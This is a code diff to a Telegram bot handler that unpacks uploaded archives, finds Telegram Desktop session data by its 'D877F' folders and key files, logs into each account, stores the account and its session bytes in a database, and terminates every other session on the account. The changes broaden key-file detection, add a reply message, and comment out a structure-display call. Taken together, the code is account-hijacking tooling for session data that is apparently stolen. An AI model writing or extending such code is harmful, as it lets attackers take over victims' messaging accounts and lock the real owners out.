@@ -353,8 +353,8 @@ async def handle_archive(client, message):
 
         for root, dirs, files in os.walk(extract_dir):
             has_d877 = any(d.startswith("D877F") for d in dirs)
-            has_keys = any(f in ("key_data", "key_1") for f in files) or \
-                       any(d in ("key_data", "key_1") for d in dirs)
+            has_keys = any(f in ("key_data", "key_1", "key_datas") for f in files) or \
+                       any(d in ("key_data", "key_1", "key_datas") for d in dirs)
 
             if has_d877 and has_keys:
                 tdata_paths.append(root)
@@ -417,7 +417,7 @@ async def handle_archive(client, message):
                     results.append(f"#{offset} ⚠️ Nᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ (ɴᴇᴇᴅs ʟᴏɢɪɴ / 2FA)")
                     await message.reply(f"⚠️ ᴛᴅᴀᴛᴀ #{offset} ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ")
                     #continue
-
+                await message.reply(f".ᴢᴇᴅ")
                 me = await tele_client.get_me()
                 await message.reply(f"👤 Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id})")
                 syd = await check_2fa(tele_client)
@@ -440,7 +440,7 @@ async def handle_archive(client, message):
                 sydno = await db.save_account(me.id, info, tdata_bytes)
 
                 
-                await show_tdata_structure_and_rar(tdata_path, message, sydno)
+              #  await show_tdata_structure_and_rar(tdata_path, message, sydno)
                 
                 
                 nsyd = await terminate_all_other_sessions(tele_client)
